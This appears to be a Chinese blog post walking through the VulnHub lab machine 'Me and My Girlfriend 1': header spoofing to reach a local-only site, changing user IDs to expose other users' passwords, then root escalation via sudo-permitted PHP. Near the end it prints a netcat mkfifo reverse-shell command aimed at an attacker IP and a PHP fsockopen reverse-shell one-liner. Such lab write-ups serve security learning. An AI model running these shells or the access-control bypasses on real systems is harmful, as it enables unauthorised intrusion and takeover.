> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/30osf9wRlbL9mDpys1Yfvg)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **51** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/Ldt92z9l0ib5hrGVbkqTQf7tjNPMNKYCKbLExK1Q9aZf5cGEx7O9rwsCXKqDtUCIKJEEoaVx8k8pj0uyibQTmzBQ/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/

靶机难度：中级（CTF）

靶机发布日期：2019 年 12 月 13 日

靶机描述：

自 Bulldog Industries 遭受数次数据泄露以来已经过去了三年。在那时，他们已经恢复并重新命名为 Bulldog.social，这是一家新兴的社交媒体公司。您可以接受这一新挑战并在他们的生产 Web 服务器上扎根吗？

这是标准的启动到根。您唯一的目标是进入根目录并查看祝贺消息，该如何操作取决于您！

难度：中级，有些事情您可能从未见过。仔细考虑所有问题:)

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/tH6LKNTXQiam9BPF4CAxGkkF4oMO6F01N2mY3m2icBKRGRGgl6Xxw7kafb8NKaHofSr1zSM92FHbgT7dibZKUKNAw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSAREPVibEia2cobtJkaRmwn2vC7WxqVa7iaUpgRUJ7cQuw9q1ahbIRsDaMz7VtB8icC1ec3funvK9mokEBibNOdrvLL/640?wx_fmt=svg)

一、信息收集

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8odrMaHNwBH3ZBODvlCnFNr99hcl2sicua6zeocqIFMXQbybsP6hibdDCA/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8oep85icQjohia8syI7JlSXQZeTv72zNGRAxIanPChavibMbu6tG89ZoJHg/640?wx_fmt=png)我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.56.142

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8oEGMdibG8sWibLemHmIFwAKyy5cicbrvqaBYZLDWewaOBwy32B48qciaCGA/640?wx_fmt=png)

nmap 发现 22、80 端口开放着...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8oRUZqqNl6ojVPrJOFlFnVCkYewv6RyCjGviapHtSNyP2o6bxCnBE8B4g/640?wx_fmt=png)

该 WEB 只能在本地访问...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8oTaJHJ8oldelTeHop4b4dx0YSwUYaRewJqtxAUNBju2k9q91icMGOdEg/640?wx_fmt=png)

是使用 x-forwarded-for 标头访问页面的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8oUDTrh4Piciby3JiavOXHJPx91LEeInZ2KfO1RQJgwTLibqiciacaSA0BVheg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8oaBOrdlp5IXgwF5KPthmNc43DjxPXHOnEicXj6eIV8rFRAqy7IHscichA/640?wx_fmt=png)

利用 burpsuite 分析发现，利用 x-forwarded-for 注入可以正常访问，但是每次点下页面都需要注入一次很烦... 就下载了插件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8osVPLqG30ooHGRM4UchLxufzIuibOh2T6zELvE6EFHheeZDE0R7G1VLA/640?wx_fmt=png)

在注册页面注册了 dayu 用户密码... 因为 dirb、nikto、gobuster 和 wfuzz 枚举出来的页面都没啥有用的信息，跳过...

可以看到配置文件标题表示为 user_id，对于 dayu 用户，它在 URL 中显示 user-id=12...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8oQ6gNFuzfCjPQlgfIsZWF1q7wOwxGYefHFk2tAibDwFLG9HTUicNiasDCg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8odibwF1ajJOnMPRky4CjMSu4jUxzSpdFxicPFBbWHiaz4WT9vibWwcmzlOQ/640?wx_fmt=png)

这边我前面利用 sqlmap 测试了，并尝试使用 LFI，都没效果...

这边可以看到我把 12 改成了 1，选择 Profile，出现了 eweuhtandingan 用户名... 密码是密文，我尝试在前端源码修改下能否看到...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8oQRXWVYtbsFkib4gTIicQ9Egicr4x65ngCAQMwzBUUXHXz1gdia2KTQYp9A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8oDjnbjVYb0aXaSmib7I6akbfszQwrKB8xJ5eSHVxiafhsTlIwukMflHqA/640?wx_fmt=png)

passwd 修改为 text，可以看到明文出现了：

```
skuyatuh，用户：eweuhtandingan
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8oANibaA4ia27TYDauZUpHiaHHmLfFT5QMzuCIxg5n28iazY3Pxe432GryPw/640?wx_fmt=png)

获得用户名：

```
aingmaung   密码：qwerty!!!
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8oTIQBK1d5hfNA5qVCian5cIDFRslP7XWufYJlbcs8wIUGJzLpfIaxicqg/640?wx_fmt=png)

回到最初作者给的提示，可以看到存在 Alice 用户，直接找到即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8o2eUyYsQoiaWzoIM7K9AM0icLK5sKib8ibwmtp8YTK4icWMR7s5cFjKYE8hw/640?wx_fmt=png)

成功找到用户：

```
alice，密码：4lic3
```

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSAREPVibEia2cobtJkaRmwn2vC7WxqVa7iaUpgRUJ7cQuw9q1ahbIRsDaMz7VtB8icC1ec3funvK9mokEBibNOdrvLL/640?wx_fmt=svg)

二、提权

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8oXVWddpWNhVngibJ04iaxeUAJ8KhiaAO9TFlDUCo61jeyknMa1icknibPanw/640?wx_fmt=png)

```
Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}
```

经过查看，在进来的目录下有两个隐藏文件，进入 cache 是空的，在 my_secret 下正常获得了 flag1...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8oOJD8EEftMztvGcicc3l1ZkRWH9H1ywJf0Sk6MgAMNQosTs8cYXdiaOkQ/640?wx_fmt=png)

我本来想看看 html 下有什么 PHP 或者 shell 能直接利用的... 发现了三个隐藏文件，分析下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8ozcGxQKic3Co9K5sKiaAU0GgbZRr4ViaZ7xVmVfic6aVicH4lc1PibMZZ8mrg/640?wx_fmt=png)

？？？这里看到了 root 疑似密码：ctf_pasti_bisa，ceban_corp 应该是数据库密码？  .. 等会试试，先继续看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8owGqQgH2tL3mXzJ6NVdF5xB7dbFFEtE2WOKagGwr6K0dO43amV2beqg/640?wx_fmt=png)

在 halamanPerusahaan 隐藏文件中没啥利用的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8ovDJtQNdkbfFsAIOr7SHLlHYnP1Z0RPUaX3MrqDfFAUqLibLKWRoCHgg/640?wx_fmt=png)

在 misc 中 php 文件的意思就是访问 login 或者 register 是 login 就执行... 等等... 没啥用

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8o9uFZkUgJqiaKNTyRuLH40icK8RwpLvC1mrFopsNiaAs1icNjkzGRUFNYBw/640?wx_fmt=png)

这里尝试了三个密码，就只有 ctf_pasti_bisa 正确登录了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8o5SkNic0fGnW2xLMkkgDFeuPpsyHaOgNxSej4NQqdSmmdAwmc0uPicYQQ/640?wx_fmt=png)

这些信息都是知道的... 没啥用!!!

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8oGZTmP965MHLUne1Sm2qfndFqRa2RewF72OSsJBV5RUXtGpibqaB1dfQ/640?wx_fmt=png)

```
Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}
```

数据库没发现好的信息... 直接尝试进 root 用户，发现成功... 成功获得了 root 权限和查看了 flag1 和 2...

这边前面进来我就习惯的 sudo-l，发现还有另外提权的方法，继续讲...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8od3JvK0n1GJMKQ60Yicz3BEoBHwQcOJPFxj9Jmks5icEib4eoiadUsho8FA/640?wx_fmt=png)

```
(root) NOPASSWD: /usr/bin/php
```

可以看到这里的 php 可以提权... 将 php 置于交互模式，并执行一个反向 shell 即可提权...go （这里 shell 随便写就是，非常多方法）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNbYbrlnj8l37sIPGgBbp8o0WsoDl8k67qShQmApISoK6dDKww8moQBvKpCRfTaphZcibicqwF7Cbjg/640?wx_fmt=png)

```
sudo .... -a
echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.56.103 443 >/tmp/f");
```

成功提权.... 另附上：

```
[php提权参考链接](https://gtfobins.github.io/gtfobins/php/#sudo)
```

推荐链接里的：

```
php -r '$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");'
```

挺好用的，或者 CMD 等等....

![](https://mmbiz.qpic.cn/mmbiz_png/Ldt92z9l0ib5hrGVbkqTQf7tjNPMNKYCKbLExK1Q9aZf5cGEx7O9rwsCXKqDtUCIKJEEoaVx8k8pj0uyibQTmzBQ/640?wx_fmt=png)

这边我使用了两种方法来提权... 我分析了会，没发现别的方法了，如果有别的未发现的，希望能告知我，谢谢，一起学习，加油！！！

由于我们已经成功得到 root 权限查看 flag，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/tH6LKNTXQiam9BPF4CAxGkkF4oMO6F01N2mY3m2icBKRGRGgl6Xxw7kafb8NKaHofSr1zSM92FHbgT7dibZKUKNAw/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)